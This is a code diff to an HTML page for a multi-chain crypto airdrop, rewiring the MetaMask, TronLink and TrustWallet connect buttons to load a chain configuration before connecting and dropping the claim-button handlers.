@@ -15,28 +15,30 @@
     <button id="connectTrustwalletButton">Connect TrustWallet</button>
     <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 
-    <!-- Load JavaScript files in correct order -->
     <script src="js/common.js"></script>
     <script src="js/metamask.js"></script>
     <script src="deeplinks/metamask-deep.js"></script>
     <script src="js/loader.js"></script>
-
-    <!-- Ensure to load wallet-specific scripts last to avoid conflicts -->
     <script src="js/eth.js"></script>
     <script src="js/bsc.js"></script>
     <script src="js/tron.js"></script>
 
-    <!-- Add an event listener for the DOMContentLoaded event to fix the addEventListener issue -->
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Attach event listeners here
-            document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-            document.getElementById('connectTronlinkButton').addEventListener('click', connectTronLink);
-            document.getElementById('connectTrustwalletButton').addEventListener('click', connectTrustWallet);
+        document.addEventListener('DOMContentLoaded', function () {
+            document.getElementById('connectButton').addEventListener('click', function() {
+                loadConfigAndABI('eth');  // Load config and ABI for Ethereum
+                connectMetaMask();        // Then call MetaMask connection logic
+            });
 
-            document.getElementById('claimAirdropButton').addEventListener('click', claimAirdropETH);
-            document.getElementById('claimTronAirdropButton').addEventListener('click', claimAirdropTRON);
-            document.getElementById('claimTrustwalletAirdropButton').addEventListener('click', claimAirdropBSC);
+            document.getElementById('connectTronlinkButton').addEventListener('click', function() {
+                loadConfigAndABI('tron');  // Load config and ABI for Tron
+                connectTronLink();         // Then call TronLink connection logic
+            });
+
+            document.getElementById('connectTrustwalletButton').addEventListener('click', function() {
+                loadConfigAndABI('bsc');  // Load config and ABI for BSC
+                connectTrustWallet();     // Then call TrustWallet connection logic
+            });
         });
     </script>
 </body>
